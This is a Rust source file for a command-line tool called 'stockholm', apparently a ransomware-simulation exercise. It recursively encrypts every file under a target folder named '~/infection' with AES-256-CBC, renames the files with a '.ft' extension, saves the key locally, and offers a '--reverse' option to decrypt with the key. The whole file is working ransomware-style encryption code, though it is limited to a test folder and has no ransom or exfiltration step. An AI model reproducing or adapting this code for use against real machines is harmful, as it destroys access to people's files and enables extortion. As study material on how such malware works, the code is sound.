use clap::{Arg, ArgAction, Command};
use libaes::Cipher;
use std::{fs, str};
use std::process::exit;
use std::time::{SystemTime, UNIX_EPOCH};
use sha2::{Sha256, Digest};
use base64::{Engine as _, engine::general_purpose};

const VERSION: &str = "v1.0";
const KEY_FILE: &str = "./stockholm.key";
const TARGET_FOLDER: &str = "~/infection";

fn decode_key(key: &String) -> [u8;32] {
	let key = general_purpose::STANDARD.decode(key).expect("Error: corrupted key");
	return key[0..32].try_into().unwrap()
}

fn generate_key() -> [u8;32] {
	let mut hasher256 = Sha256::new();
	let key = whoami::hostname() +
		whoami::username().as_str() +
		SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos().to_string().as_str();
	hasher256.update(key.as_bytes());
	let key = format!("{:x}", hasher256.clone().finalize()).into_bytes();
	let key = key[0..32].try_into().unwrap();
	return key;
}

fn generate_file_iv(key_encoded: &str) -> [u8;16] {
	let mut hasher256 = Sha256::new();
	hasher256.update(format!("{key_encoded}{VERSION}"));
	let iv = format!("{:x}", hasher256.clone().finalize()).into_bytes();
	return iv[0..16].try_into().unwrap();
}

fn cipher_file(cipher: &Cipher, key_encoded: &String, file_path: &str, extension: &str) -> [u8;16] {
	let file_data = fs::read(file_path).expect("Error: unable to read file");
	let file_iv = generate_file_iv(key_encoded.as_str());
	let file_ciphered = cipher.cbc_encrypt(&file_iv, file_data.as_slice());
	let file_encoded = general_purpose::STANDARD.encode(&file_ciphered);
	fs::write(file_path, file_encoded).expect("Error: unable to write ciphered file");
	if extension != "ft" {
		fs::rename(file_path, format!("{file_path}.ft")).unwrap();
	};
	return file_iv;
}

fn cipher_folder(cipher: &Cipher, key_encoded: &String, folder_path: &str, silent: bool) {
	let paths = fs::read_dir(folder_path).unwrap();

	for path in paths {
		let path = path.unwrap().path();
		let file_metadata = fs::metadata(path.clone()).expect("Error: unable to get metadata");
		if file_metadata.is_dir() {
			cipher_folder(cipher, key_encoded, path.to_str().unwrap(), silent);
			continue;
		}
		let extension = path.extension().unwrap().to_str().unwrap();
		// TODO add registry of supported extensions
		let path = path.to_str().unwrap();
		cipher_file(&cipher, &key_encoded, path, extension);
		if !silent { println!("{path}"); }
	}
}

fn decipher_file(cipher: &Cipher, key_encoded: &String, file_path: &str) -> [u8;16] {
	let file_iv = generate_file_iv(key_encoded);
	let file_data = fs::read(file_path).expect("Error: unable to read file");
	let file_data = general_purpose::STANDARD.decode(&file_data).expect("Error: unable to decode file");
	let file_data = cipher.cbc_decrypt(file_iv.as_slice(), &file_data);
	let file_data = String::from_utf8(file_data);
	if let Err(err) = file_data {
		eprintln!("Error: unable to serialize file: {err}");
		return file_iv;
	}
	let file_data = file_data.unwrap();
	let new_file_name = file_path.strip_suffix(".ft").expect("Error: unable to remove extension from file");
	fs::write(file_path, file_data).expect("Error: unable to write deciphered file");
	fs::rename(file_path, new_file_name).expect("Error: unable to rename file");
	return file_iv;
}

fn decipher_folder(cipher: &Cipher, key_encoded: &String, folder_path: &str, silent: bool) {
	let paths = fs::read_dir(folder_path).unwrap();

	for path in paths {
		let path = path.unwrap().path();
		let file_metadata = fs::metadata(path.clone()).expect("Error: unable to get metadata");
		if file_metadata.is_dir() {
			decipher_folder(cipher, key_encoded, path.to_str().unwrap(), silent);
			continue;
		}
		let extension = path.extension().unwrap().to_str().unwrap();
		if extension != "ft" { continue };
		let path = path.to_str().unwrap();

		decipher_file(cipher, key_encoded, path);
		if !silent { println!("{path}"); }
	}
}

fn cipher_command(silent: bool) {
	let key = generate_key();
	let key_encoded = general_purpose::STANDARD.encode(&key);
	fs::write(KEY_FILE, key_encoded.clone()).expect("Error: unable to create key file");

	let cipher = Cipher::new_256(&key);
	cipher_folder(&cipher, &key_encoded, TARGET_FOLDER, silent)
}

fn decipher_command(key_encoded: &String, silent: bool) {
	let key = decode_key(key_encoded);
	let cipher = Cipher::new_256(&key);
	decipher_folder(&cipher, key_encoded, TARGET_FOLDER, silent);
}

fn main() {
	let matches = Command::new("stockholm")
		.about("encrypts the target folder")
		.arg(Arg::new("version")
			.short('v')
			.long("version")
			.action(ArgAction::SetTrue)
			.help("prints the current version"))
		.arg(Arg::new("silent")
			.short('s')
			.long("silent")
			.action(ArgAction::SetTrue)
			.help("do not print encrypted file names"))
		.arg(Arg::new("reverse")
			.short('r')
			.long("reverse")
			.exclusive(true)
			.value_parser(clap::value_parser!(String))
			.value_name("KEY")
			.help("decrypts the target folder"))
		.get_matches();

	if matches.get_flag("version") {
		println!("stockholm {VERSION}");
	}

	if let Err(err) = fs::metadata(TARGET_FOLDER) {
		eprintln!("Error: could not open target folder '{TARGET_FOLDER}': {err}");
		exit(1);
	}

	if let Some(key) = matches.get_one::<String>("reverse") {
		decipher_command(key, matches.get_flag("silent"));
		exit(0);
	}

	cipher_command(matches.get_flag("silent"));
}
